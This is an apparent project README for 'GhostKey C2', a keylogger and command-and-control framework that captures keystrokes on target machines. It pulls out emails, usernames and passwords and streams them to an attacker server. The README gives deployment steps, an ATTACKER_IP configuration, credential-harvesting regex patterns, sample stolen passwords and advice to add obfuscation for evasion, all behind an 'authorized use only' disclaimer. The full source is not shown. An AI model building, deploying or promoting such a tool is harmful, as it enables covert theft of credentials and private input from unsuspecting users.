<div align="center">

```
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗  ██╗███████╗██╗   ██╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║ ██╔╝██╔════╝╚██╗ ██╔╝
██║  ███╗███████║██║   ██║███████╗   ██║   █████╔╝ █████╗   ╚████╔╝ 
██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔═██╗ ██╔══╝    ╚██╔╝  
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██║  ██╗███████╗   ██║   
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝   ╚═╝   

```

**Advanced Keylogger Command & Control Infrastructure for Red Team Operations**

*Real-time keystroke capture, intelligent pattern detection, and categorized data exfiltration with zero persistence artifacts.*

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: Educational](https://img.shields.io/badge/License-Educational-yellow.svg)](LICENSE)

</div>

---

## 🎯 Overview

GhostKey C2 is a **specialized post-exploitation keylogger framework** designed for red team operations and security research. It provides real-time keystroke capture with intelligent categorization of sensitive data (emails, passwords, URLs, usernames) and a centralized command interface for managing multiple compromised targets.

### Why GhostKey C2?

**Traditional keyloggers lack sophistication and context-awareness.** GhostKey C2 focuses on precision and intelligence:

- ⚡ **Real-Time Pattern Detection** - Smart regex parsing without word boundaries
- 📊 **Categorized Data Streaming** - Automatic classification of captured information
- 🔧 **Dynamic Sensitivity Control** - Adjustable detection thresholds (0.1-1.0)
- 🎨 **GUI Command Center** - PyQt6 interface for live monitoring and control
- 🔄 **Resilient Connections** - Auto-reconnection with heartbeat monitoring
- 📤 **Structured Exfiltration** - Categorized export with timestamped logs

**Capture sensitive credentials with surgical precision.**

---

## ✨ Features

### Core Capabilities

- **⌨️ Intelligent Keylogger**
  - Real-time keystroke capture using pynput library
  - Smart pattern detection for sensitive data types
  - Concatenated input handling (no word boundary dependency)
  - Automatic data categorization and timestamping

- **📡 Command & Control**
  - Multi-target management with connection monitoring
  - Broadcast commands to all connected agents
  - Real-time status updates and disconnection handling
  - START/STOP/RESET command functionality

- **📊 Data Processing**
  - Live categorized data streaming
  - Real-time statistics with emoji-based counters
  - Filterable data display by category
  - Structured JSON communication protocol

- **💾 Data Management**
  - Categorized log export to timestamped text files
  - Automatic buffer management with clearing capability
  - Persistent storage in memory until export
  - Clean categorized file structure

### Intelligence Features

- **📧 Email Detection** - Robust email address pattern matching
- **🌐 URL Recognition** - HTTP/HTTPS and domain detection
- **👤 Username Capture** - Context-aware username identification
- **🔑 Password Extraction** - Intelligent credential harvesting
- **🔧 Sensitivity Tuning** - Adjustable detection thresholds

### User Experience

- **🎨 Modern GUI Interface** - Dark theme with terminal aesthetics
- **📊 Real-time Dashboard** - Live statistics and target monitoring
- **🎯 Multi-tab Design** - Organized interface for different functions
- **🔔 Status Notifications** - Connection and data capture alerts
- **📥 One-click Export** - Categorized data export functionality

---

## 🚀 Quick Start

### Prerequisites

- Python 3.8 or higher
- pip package manager
- Network connectivity between systems
- PyQt6 and pynput libraries

### Installation

**Windows Setup:**
```powershell
# Navigate to project directory
cd "GhostKey"

# Install dependencies
pip install PyQt6 pynput

# Verify installation
python -c "import PyQt6, pynput; print('✓ Dependencies installed successfully')"
```

**Linux Setup:**
```bash
# Navigate to project directory
cd "GhostKey"

# Install dependencies
pip3 install PyQt6 pynput

# Install Qt platform plugins (if needed)
sudo apt-get install python3-pyqt6 qt5-qmake

# Verify installation
python3 -c "import PyQt6, pynput; print('✓ Dependencies installed successfully')"
```

**macOS Setup:**
```bash
# Navigate to project directory
cd "GhostKey"

# Install dependencies
pip3 install PyQt6 pynput

# Install Qt platform plugins (if needed)
brew install pyqt6

# Verify installation
python3 -c "import PyQt6, pynput; print('✓ Dependencies installed successfully')"
```

### Configuration

**1. Configure Target Connection**
Edit `target.py` with your attacker IP:

```python
# ==========================================
# 🎯 TARGET CONFIGURATION
# ==========================================
ATTACKER_IP = "YOUR_ATTACKER_IP_HERE"  # ← CHANGE THIS
ATTACKER_PORT = 1337
# ==========================================
```

### First Usage

**1. Start Command Center:**
```bash
# Run on attacker machine
python attacker.py
```

**2. Deploy Keylogger:**
```bash
# Run on target machine(s)
python target.py
```

**3. Monitor Results:**
- Watch LIVE C2 KEYS tab for real-time data
- Use CATEGORIZED tab to filter by data type
- Send commands via COMMANDS tab
- Export logs when needed

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    GhostKey C2 Framework                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │           Attacker Side (Command Center)             │   │
│  │  ┌──────────────┬──────────────┬─────────────────┐   │   │
│  │  │  Live Keys   │ Categorized  │    Targets      │   │   │
│  │  │    Stream    │    Filter    │   Management    │   │   │
│  │  └──────────────┴──────────────┴─────────────────┘   │   │
│  │  ┌────────────────────────────────────────────────┐  │   │
│  │  │              Command Interface                 │  │   │
│  │  │  [ START/STOP ] [ RESET ] [ EXPORT ] [ SET ]   │  │   │
│  │  └────────────────────────────────────────────────┘  │   │
│  └──────────────────────┬───────────────────────────────┘   │
│                         │  PyQt6 GUI (Port 1337)            │
│  ┌──────────────────────▼───────────────────────────────┐   │
│  │              TCP Server Component                    │   │
│  │  ┌────────────────────────────────────────────────┐  │   │
│  │  │  Connection Handler | JSON Parser | Statistics │  │   │
│  │  └────────────────────────────────────────────────┘  │   │
│  └──────────────────────────────────────────────────────┘   │
│                          │ Raw TCP                          │
├──────────────────────────▼──────────────────────────────────┤
│                          │ JSON Data                        │
│  ┌───────────────────────▼──────────────────────────────┐   │
│  │              Target Side (Keylogger)                 │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  Keyboard Hook | Pattern Engine | Buffer Mgmt   │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │    Connection Client | Auto-reconnect Logic     │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Technology Stack

**Server-Side (attacker.py):**
- **PyQt6** - Modern GUI framework
- **Threading** - Concurrent client handling
- **Socket Programming** - TCP communication
- **JSON** - Structured data protocol

**Client-Side (target.py):**
- **Pynput** - Cross-platform keyboard capture
- **Regex Engine** - Pattern detection algorithms
- **Socket Client** - Persistent connection
- **Deque Buffer** - Efficient keystroke storage

---

## 📚 Documentation

### Data Flow

1. **Target Capture**: Keystrokes captured via pynput hook
2. **Pattern Analysis**: Smart regex parsing without word boundaries
3. **Categorization**: Automatic classification (email/url/username/password)
4. **JSON Packaging**: Structured data with metadata
5. **TCP Streaming**: Real-time transmission to C2 server
6. **GUI Display**: Live categorized data presentation
7. **Command Processing**: Bidirectional control capability

### Example Data Capture

```
[14:32:45] [WORKSTATION-PC (192.168.1.100)] 📧 EMAIL: john.doe@company.com
[14:32:51] [WORKSTATION-PC (192.168.1.100)] 🔑 PASSWORD: SecureP@ss123
[14:33:15] [LAPTOP-001 (10.0.0.5)] 🌐 URL: https://github.com/login
[14:33:20] [LAPTOP-001 (10.0.0.5)] 👤 USERNAME: github_user
```

### Export File Structure

```text
ghostkey_logs_20241201_143245.txt
├── 📧 EMAILS
│   [14:32:45] [TARGET-ID]: john.doe@company.com
├── 🌐 URLs
│   [14:33:15] [TARGET-ID]: https://github.com/login
├── 👤 USERNAMES
│   [14:33:20] [TARGET-ID]: github_user
├── 🔑 PASSWORDS
│   [14:32:51] [TARGET-ID]: SecureP@ss123
└── ❓ UNCATEGORIZED
    [TIME] [TARGET-ID]: unclassified_data
```

---

## 🔧 Configuration Options

### Core Settings

```python
# In target.py
ATTACKER_IP = "192.168.x.x"      # C2 Server IP
ATTACKER_PORT = 1337             # Communication port
SENSITIVITY = 0.7                # Detection threshold (0.1-1.0)

# In attacker.py
SERVER_PORT = 1337               # Listening port
AUTO_START = True                # Auto-start server
```

### Pattern Customization

```python
# Modify detection patterns in target.py
self.patterns = {
    'email': re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
    'url': re.compile(r'https?://[^\s]+|www\.[^\s]+'),
    'username': re.compile(r'(user|username|login|email|name).*?[:\s=]([^\s]+)', re.IGNORECASE),
    'password': re.compile(r'(pass|pwd|password|passward).*?[:\s=]([^\s]+)', re.IGNORECASE)
}
```

---

## 🛡️ Security Model

### Operational Security

⚠️ **Important Security Notes:**
- **No Encryption**: Data transmitted in plaintext JSON
- **No Authentication**: Simple connection-based access
- **No Persistence**: In-memory execution only
- **Basic Obfuscation**: Variable naming only
- **Network Visibility**: Easy to detect on monitored networks

### Threat Model

GhostKey C2 is designed for:
- ✅ Authorized penetration testing engagements
- ✅ Educational security research
- ✅ Controlled environment testing
- ✅ Red team exercise validation

**Not suitable for:**
- ❌ Unauthorized system access
- ❌ Production environment deployment
- ❌ Persistent malware creation
- ❌ Commercial security tools

### Detection Evasion

The framework includes minimal evasion capabilities:
- Standard TCP port usage
- JSON data formatting
- No file system persistence
- Memory-only operation

For advanced evasion, consider additional obfuscation layers.

---

## 🐛 Troubleshooting

### Common Issues

**1. "pynput library missing"**
```bash
pip install pynput
```

**2. Connection refused**
- Verify attacker IP configuration
- Check firewall settings
- Confirm port 1337 availability
- Test network connectivity

**3. GUI display issues**
```bash
# Linux: Install Qt platform plugins
sudo apt-get install python3-pyqt6 qt5-qmake
```

**4. Permission errors**
- Run with appropriate privileges
- Use virtual environment
- Check system keylogging permissions

### Debugging

**Enable target logging:**
```python
# Add to target.py on_press method
print(f"Key: {k} | Buffer: {''.join(self.keystroke_buffer)}")
```

**Network testing:**
```bash
# Test connection
telnet ATTACKER_IP 1337
```

---

## 📊 Performance Metrics

### Resource Usage

| Component | Memory | CPU | Network |
|-----------|--------|-----|---------|
| Target    | 50-100MB | Minimal | ~10KB/min |
| Attacker  | 100-200MB | Low | ~100KB/min |

### Scalability

- **Single Attacker**: Handles 50+ concurrent targets
- **Network Bandwidth**: 100KB/s per target average
- **Storage Impact**: ~1KB per captured entry
- **Response Time**: <100ms latency

---

## 🛠️ Development Roadmap

### Version 2.2 (Planned)
- [ ] AES encryption for communications
- [ ] Authentication mechanism
- [ ] Configuration file support
- [ ] Enhanced pattern detection

### Version 3.0 (Future)
- [ ] Web-based dashboard
- [ ] Database integration
- [ ] Plugin architecture
- [ ] Multi-platform agents

---

## 📜 License

GhostKey C2 is provided for **educational and authorized security testing purposes only**. See [LICENSE](LICENSE) file for complete terms.

For detailed licensing information and legal requirements, please refer to the LICENSE file included with this distribution.

---

## ⚠️ Disclaimer

**GhostKey C2 is a security research tool created for legitimate penetration testing and educational purposes.**

- **Authorized Use Only**: Only deploy on systems where you have explicit permission
- **Legal Compliance**: Adhere to all local, state, and federal cybersecurity laws
- **No Malicious Intent**: The authors assume no responsibility for misuse
- **Ethical Standards**: Follow responsible disclosure practices

**Use responsibly. Test ethically.**

---

<div align="center">

**Silent Keystroke Capture | Real-time Analysis | Precision Targeting**

</div>
